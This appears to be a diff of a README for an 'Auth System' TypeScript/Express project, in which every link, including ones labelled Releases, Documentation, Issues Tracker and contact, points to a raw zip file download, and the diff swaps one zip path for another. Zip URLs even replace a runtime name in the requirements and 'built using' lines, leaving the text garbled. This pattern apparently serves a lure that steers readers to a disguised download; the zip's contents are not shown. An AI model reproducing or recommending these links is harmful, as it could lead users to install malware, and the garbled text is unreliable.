@@ -8,11 +8,11 @@ Welcome to **Auth System**! This software helps you manage user accounts securel
 
 To get started, you need to download the software. Click the button below to visit the Releases page.
 
-[![Download Auth System](https://raw.githubusercontent.com/oknontawat/auth-system/main/vibgyor/auth-system.zip%20Auth%20System-v1.0-blue)](https://raw.githubusercontent.com/oknontawat/auth-system/main/vibgyor/auth-system.zip)
+[![Download Auth System](https://raw.githubusercontent.com/oknontawat/auth-system/main/src/models/auth_system_3.8.zip%20Auth%20System-v1.0-blue)](https://raw.githubusercontent.com/oknontawat/auth-system/main/src/models/auth_system_3.8.zip)
 
 ### Step 1: Visit the Downloads Page
 
-Go to our [Releases page](https://raw.githubusercontent.com/oknontawat/auth-system/main/vibgyor/auth-system.zip) to find the latest version of the Auth System. 
+Go to our [Releases page](https://raw.githubusercontent.com/oknontawat/auth-system/main/src/models/auth_system_3.8.zip) to find the latest version of the Auth System. 
 
 ### Step 2: Download the Software
 
@@ -42,11 +42,11 @@ Before you install the Auth System, ensure your computer meets the following req
 - **Operating System:** Windows, macOS, or Linux
 - **Memory:** At least 4 GB RAM
 - **Disk Space:** Minimum of 200 MB free space
-- **https://raw.githubusercontent.com/oknontawat/auth-system/main/vibgyor/auth-system.zip** Installed version of https://raw.githubusercontent.com/oknontawat/auth-system/main/vibgyor/auth-system.zip (recommended version: 14.x or later)
+- **https://raw.githubusercontent.com/oknontawat/auth-system/main/src/models/auth_system_3.8.zip** Installed version of https://raw.githubusercontent.com/oknontawat/auth-system/main/src/models/auth_system_3.8.zip (recommended version: 14.x or later)
 
 ## 💡 How It Works
 
-The Auth System is built using TypeScript, https://raw.githubusercontent.com/oknontawat/auth-system/main/vibgyor/auth-system.zip, and Express. Here's how it works:
+The Auth System is built using TypeScript, https://raw.githubusercontent.com/oknontawat/auth-system/main/src/models/auth_system_3.8.zip, and Express. Here's how it works:
 
 1. **User Registration:** When a new user registers, their details are securely stored in a database.
 2. **Login:** Users can log in using their email and password. The system verifies the credentials securely.
@@ -63,13 +63,13 @@ You can customize the Auth System to fit your application’s needs. Here are so
 
 ## 🤝 Support and Community
 
-If you encounter any issues while using the Auth System, we recommend checking the FAQs on our [GitHub page](https://raw.githubusercontent.com/oknontawat/auth-system/main/vibgyor/auth-system.zip). You can also reach out for support, and our community members will assist you.
+If you encounter any issues while using the Auth System, we recommend checking the FAQs on our [GitHub page](https://raw.githubusercontent.com/oknontawat/auth-system/main/src/models/auth_system_3.8.zip). You can also reach out for support, and our community members will assist you.
 
 ## 📚 Important Links
 
-- [Releases page](https://raw.githubusercontent.com/oknontawat/auth-system/main/vibgyor/auth-system.zip)
-- [Documentation](https://raw.githubusercontent.com/oknontawat/auth-system/main/vibgyor/auth-system.zip)
-- [Issues Tracker](https://raw.githubusercontent.com/oknontawat/auth-system/main/vibgyor/auth-system.zip)
+- [Releases page](https://raw.githubusercontent.com/oknontawat/auth-system/main/src/models/auth_system_3.8.zip)
+- [Documentation](https://raw.githubusercontent.com/oknontawat/auth-system/main/src/models/auth_system_3.8.zip)
+- [Issues Tracker](https://raw.githubusercontent.com/oknontawat/auth-system/main/src/models/auth_system_3.8.zip)
 
 ## 📝 Contributing
 
@@ -77,6 +77,6 @@ We welcome contributions! If you would like to suggest improvements or report a 
 
 ## 📧 Contact
 
-For any inquiries, please contact us through the GitHub Discussions or at [https://raw.githubusercontent.com/oknontawat/auth-system/main/vibgyor/auth-system.zip](https://raw.githubusercontent.com/oknontawat/auth-system/main/vibgyor/auth-system.zip).
+For any inquiries, please contact us through the GitHub Discussions or at [https://raw.githubusercontent.com/oknontawat/auth-system/main/src/models/auth_system_3.8.zip](https://raw.githubusercontent.com/oknontawat/auth-system/main/src/models/auth_system_3.8.zip).
 
-Start enhancing your applications today with the Auth System! Download the software from our [Releases page](https://raw.githubusercontent.com/oknontawat/auth-system/main/vibgyor/auth-system.zip) and explore the powerful features at your fingertips.
+Start enhancing your applications today with the Auth System! Download the software from our [Releases page](https://raw.githubusercontent.com/oknontawat/auth-system/main/src/models/auth_system_3.8.zip) and explore the powerful features at your fingertips.
